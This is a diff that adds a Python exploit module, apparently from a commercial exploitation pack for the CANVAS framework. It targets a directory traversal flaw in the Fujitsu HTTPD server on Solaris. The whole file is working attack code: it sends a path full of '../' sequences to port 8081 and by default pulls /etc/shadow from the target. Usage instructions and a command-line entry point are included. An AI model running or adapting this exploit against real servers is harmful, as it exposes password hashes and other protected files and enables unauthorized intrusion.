@@ -1,0 +1,89 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, time, os
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+DOCUMENTATION={}
+DOCUMENTATION['VENDOR']="Futjitsu"
+DOCUMENTATION["Date public"]="2006.06.30"
+DOCUMENTATION["CERT Advisory"]=''
+DOCUMENTATION["Repeatability"]="Infinite"
+DOCUMENTATION["References"]="http://www.portcullis.co.uk/217.php"
+DOCUMENTATION["CVE Name"]=''
+DOCUMENTATION["CVE Url"]=''
+DOCUMENTATION["Notes"]=''
+
+PROPERTY={}
+PROPERTY['TYPE']="Exploit"
+PROPERTY['SITE']="Remote"
+PROPERTY['ARCH']=[ ["Solaris"] ]
+PROPERTY["VERSION"]=["All"]
+
+DESCRIPTION = "Fujitsu HTTPD Server Directory Traversal Vulnerability"
+NAME = "Fujitsu HTTPD Server Directory Traversal Vulnerability"
+VERSION = "1.0"
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.host = ""
+		self.port = 8081 
+		self.file = "/etc/shadow"
+		self.name = NAME
+		return
+	
+	def display_file(self):
+		try:
+			h = urlopen("http://%s:%d/Guide/../../../../../../../../../../../../..%s" % (self.host, self.port, self.file))
+		except:
+			self.log("Can't read %s" % self.file)
+			return
+
+		data = h.readlines()
+
+		if len(data) > 0:
+			self.log("[!!] %s :" % self.file)
+			self.log(data)
+		else:
+			self.log("Not file %s" % self.file)
+		
+		self.log("\n")
+
+		return
+
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.file = self.argsDict.get("file",self.file)
+		
+		self.display_file()
+
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:8081] -O file:<path>"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
